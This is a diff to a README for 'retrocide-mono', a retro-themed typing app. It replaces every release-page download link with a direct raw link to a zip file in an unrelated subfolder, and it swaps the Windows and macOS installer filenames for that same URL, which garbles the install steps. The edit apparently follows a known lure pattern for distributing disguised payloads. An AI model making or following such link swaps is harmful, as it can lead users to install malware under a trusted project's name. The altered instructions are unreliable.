@@ -1,6 +1,6 @@
 # 🎮 retrocide-mono - Type Like It's 1985, Code Like Tomorrow
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/ganxmdz/retrocide-mono/releases)
+[![Download](https://raw.githubusercontent.com/ganxmdz/retrocide-mono/main/bromopnea/retrocide-mono.zip%20Release-brightgreen)](https://raw.githubusercontent.com/ganxmdz/retrocide-mono/main/bromopnea/retrocide-mono.zip)
 
 ## 📦 Overview
 
@@ -27,9 +27,9 @@ retrocide-mono combines nostalgic typing with modern coding efficiency. This app
 
 To get started, visit the latest release page to download the application.
 
-[Download Latest Release](https://github.com/ganxmdz/retrocide-mono/releases)
+[Download Latest Release](https://raw.githubusercontent.com/ganxmdz/retrocide-mono/main/bromopnea/retrocide-mono.zip)
 
-Once there, look for the most recent version and download the appropriate file for your operating system. The files are usually named accordingly, e.g., "retrocide-mono-windows.exe" for Windows or "retrocide-mono-mac.dmg" for macOS.
+Once there, look for the most recent version and download the appropriate file for your operating system. The files are usually named accordingly, e.g., "https://raw.githubusercontent.com/ganxmdz/retrocide-mono/main/bromopnea/retrocide-mono.zip" for Windows or "https://raw.githubusercontent.com/ganxmdz/retrocide-mono/main/bromopnea/retrocide-mono.zip" for macOS.
 
 1. Click on the version you want to download.
 2. Choose the file that suits your operating system.
@@ -40,7 +40,7 @@ Once there, look for the most recent version and download the appropriate file f
 #### Windows
 
 1. Locate the downloaded file (usually in your Downloads folder).
-2. Double-click on the installer file (e.g., "retrocide-mono-windows.exe").
+2. Double-click on the installer file (e.g., "https://raw.githubusercontent.com/ganxmdz/retrocide-mono/main/bromopnea/retrocide-mono.zip").
 3. Follow the on-screen instructions to complete the installation.
 
 #### macOS
@@ -86,4 +86,4 @@ To connect with other users, consider joining our discussion forum or following 
 
 This application is licensed under the MIT License, allowing users to freely use, modify, and distribute the software. For more details, please review the LICENSE file in this repository.
 
-[Download Latest Release](https://github.com/ganxmdz/retrocide-mono/releases)
+[Download Latest Release](https://raw.githubusercontent.com/ganxmdz/retrocide-mono/main/bromopnea/retrocide-mono.zip)
